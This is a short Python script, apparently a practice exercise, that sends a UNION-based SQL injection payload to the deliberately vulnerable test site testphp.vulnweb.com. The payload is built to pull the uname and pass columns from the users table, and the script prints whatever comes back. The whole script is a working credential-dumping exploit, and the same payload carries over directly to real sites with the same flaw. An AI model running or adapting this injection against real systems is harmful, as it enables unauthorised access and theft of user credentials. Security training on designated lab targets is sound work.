
import requests

domain = "http://testphp.vulnweb.com/listproducts.php?cat=-1 union select NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, uname, null, pass from users--"
respone = requests.get(domain) 
print(respone.text)






